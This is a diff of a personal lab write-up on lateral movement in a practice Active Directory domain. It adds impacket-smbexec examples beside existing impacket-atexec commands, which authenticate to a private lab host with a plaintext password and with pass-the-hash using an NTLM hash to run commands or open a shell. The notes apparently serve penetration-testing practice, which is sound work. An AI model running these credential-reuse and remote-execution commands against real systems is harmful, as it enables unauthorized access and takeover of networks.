@@ -140,15 +140,25 @@ Using impacket-psexec there seems to be a failure in popping a shell when using 
 
 attempted to use wmiexec instead, with no success. However after some trial and error atexec seemed like the one to go with. Unsure as to the reason why this one worked, but there seems to be some researcg suggesting the prior ones may be mitigated by Defender.  
 
-Using atexec with domain/user and password
+👍Using atexec with domain/user and password
 
             impacket-atexec MARVEL/fcastle:'Password1'@192.168.64.139 "whoami"
 ![image](https://github.com/user-attachments/assets/3bdef2d4-e172-4b36-aaa0-c0927494f0d8)  
 
-Using atexec with administrator and hash
+👍Using atexec with administrator and hash
 
             impacket-atexec administrator@192.168.64.139 -hashes aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc "whoami"
 ![image](https://github.com/user-attachments/assets/36981884-3a94-4d8e-a8e9-d0c4508988ed)
+
+👍Using smbexec with domain/user and password
+
+            impacket-smbexec MARVEL/fcastle:Password1@192.168.64.139  
+![image](https://github.com/user-attachments/assets/3852e0ef-d03a-4df7-a508-aed4d5e33ff3)
+
+👍4Using smbexec with administrator and hash
+
+            /home/kali# impacket-smbexec administrator@192.168.64.139 -hashes aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc
+![image](https://github.com/user-attachments/assets/6d13d42c-9e78-472c-8164-52fe8f118a14)
 
 ### 🟣 Findings  
 After some trial and error, not all 'execs' will work and this is normal in the real world. Through trial and error in this case the two that was discovered to work for both 'domain/user + password' and 'administrator + password' was **impackets**:
